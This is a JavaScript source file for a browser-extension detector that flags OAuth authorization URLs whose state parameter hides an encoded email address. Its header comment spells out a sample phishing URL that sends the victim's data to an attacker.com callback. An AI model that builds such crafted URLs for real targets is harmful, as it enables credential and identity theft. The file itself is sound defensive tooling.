/**
 * extension/content/state_parameter_abuse.js
 *
 * OAuthGuard — OAuth state parameter email encoding detector.
 *
 * Threat context (Microsoft, March 2, 2026):
 *   Attackers encode the victim's email address in base64 and inject it as the OAuth
 *   `state` parameter in a crafted authorization URL. When the victim authenticates,
 *   the OAuth callback delivers the decoded email back to the attacker's redirect_uri —
 *   a clean exfil channel that rides legitimate OAuth infrastructure and bypasses all
 *   content-level filters.
 *
 *   Canonical attack URL:
 *     https://login.microsoftonline.com/common/oauth2/authorize
 *       ?client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46   <- Azure CLI (pre-consented)
 *       &response_type=code
 *       &redirect_uri=https://attacker.com/callback
 *       &state=dmljdGltQGNvcnAuY29t                        <- base64("victim@corp.com")
 *       &scope=openid profile email offline_access
 *
 * Fires on: chrome.webRequest.onBeforeRequest for OAuth authorization endpoint URLs.
 *
 * References:
 *   - Microsoft Security Blog, March 2, 2026
 *   - MSTIC Storm-2372 (device code flow + state abuse combination)
 */

'use strict';

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const OAUTH_AUTH_ENDPOINTS = [
  'login.microsoftonline.com',
  'accounts.google.com',
  'login.live.com',
  'auth.apple.com',
  'github.com',
  'login.salesforce.com',
  'login.okta.com',
  'login.windows.net',
];

const EMAIL_REGEX = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

function looksLikeEmail(str) {
  return EMAIL_REGEX.test(str.trim());
}

function tryDecode(rawValue) {
  if (!rawValue || rawValue.length < 4) {
    return null;
  }

  // Strategy 1: Base64 (standard and URL-safe variant)
  try {
    const normalised = rawValue
      .replace(/-/g, '+')
      .replace(/_/g, '/')
      .replace(/[^A-Za-z0-9+/=]/g, '');

    const padded = normalised + '='.repeat((4 - (normalised.length % 4)) % 4);
    const decoded = atob(padded);

    if (decoded && /^[\x20-\x7E]+$/.test(decoded)) {
      return { decoded: decoded.trim(), method: 'base64' };
    }
  } catch (_) {
    // Fall through
  }

  // Strategy 2: Hex encoding
  if (/^[0-9a-f]{8,}$/i.test(rawValue)) {
    try {
      const decoded = rawValue
        .match(/.{1,2}/g)
        .map(byte => String.fromCharCode(parseInt(byte, 16)))
        .join('');
      if (decoded && /^[\x20-\x7E]+$/.test(decoded)) {
        return { decoded: decoded.trim(), method: 'hex' };
      }
    } catch (_) {
      // Fall through
    }
  }

  // Strategy 3: URL percent-encoding
  if (rawValue.includes('%')) {
    try {
      const decoded = decodeURIComponent(rawValue);
      if (decoded !== rawValue) {
        return { decoded: decoded.trim(), method: 'url' };
      }
    } catch (_) {
      // Fall through
    }
  }

  return null;
}

// ---------------------------------------------------------------------------
// Main detector
// ---------------------------------------------------------------------------

/**
 * @typedef {Object} StateAbuseResult
 * @property {boolean}  detected
 * @property {string}   type
 * @property {string}   decodedEmail
 * @property {string}   stateValue
 * @property {string}   encodingMethod
 * @property {number}   riskScore
 * @property {string[]} signals
 */

/**
 * Detect OAuth state parameter email encoding in an authorization request URL.
 * @param {string} url
 * @returns {StateAbuseResult}
 */
function detectStateParameterAbuse(url) {
  const CLEAN = (signals) => ({
    detected: false,
    type: '',
    decodedEmail: '',
    stateValue: '',
    encodingMethod: '',
    riskScore: 0.0,
    signals,
  });

  try {
    if (!url || typeof url !== 'string') {
      return CLEAN(['no_url']);
    }

    let urlObj;
    try {
      urlObj = new URL(url);
    } catch (_) {
      return CLEAN(['url_parse_error']);
    }

    const hostname = urlObj.hostname.toLowerCase();
    const isOAuthEndpoint = OAUTH_AUTH_ENDPOINTS.some(ep => hostname === ep || hostname.endsWith('.' + ep));

    if (!isOAuthEndpoint) {
      return CLEAN(['not_oauth_endpoint']);
    }

    const stateValue = urlObj.searchParams.get('state');
    if (!stateValue || stateValue.length < 4) {
      return CLEAN(['no_state_param']);
    }

    // Fast path: URLSearchParams already decoded a percent-encoded email
    if (looksLikeEmail(stateValue)) {
      const decodedEmail = stateValue.trim();
      return {
        detected: true,
        type: 'OAUTH_STATE_EMAIL_ENCODED',
        decodedEmail,
        stateValue: stateValue.substring(0, 64),
        encodingMethod: 'url',
        riskScore: 0.85,
        signals: [
          `email_in_state_param:${decodedEmail}`,
          'encoding:url',
          `oauth_endpoint:${hostname}`,
        ],
      };
    }

    const decodeResult = tryDecode(stateValue);
    if (!decodeResult) {
      return CLEAN(['state_not_decodable']);
    }

    if (!looksLikeEmail(decodeResult.decoded)) {
      return CLEAN(['state_decoded_not_email']);
    }

    const decodedEmail = decodeResult.decoded.trim();
    return {
      detected: true,
      type: 'OAUTH_STATE_EMAIL_ENCODED',
      decodedEmail,
      stateValue: stateValue.substring(0, 64),
      encodingMethod: decodeResult.method,
      riskScore: 0.85,
      signals: [
        `email_in_state_param:${decodedEmail}`,
        `encoding:${decodeResult.method}`,
        `oauth_endpoint:${hostname}`,
      ],
    };

  } catch (err) {
    return {
      detected: false,
      type: '',
      decodedEmail: '',
      stateValue: '',
      encodingMethod: '',
      riskScore: 0.0,
      signals: ['detector_error'],
    };
  }
}

/* ------------------------------------------------------------------ */
/*  Test export bridge                                                 */
/* ------------------------------------------------------------------ */
// Chrome MV3 content scripts are classic scripts — top-level `export`
// throws SyntaxError. Register public API on a global namespace so
// vitest can side-effect-import and read from the global.

if (typeof globalThis !== 'undefined') {
  globalThis.__phishopsExports = globalThis.__phishopsExports || {};
  globalThis.__phishopsExports['state_parameter_abuse'] = {
    detectStateParameterAbuse,
  };
}
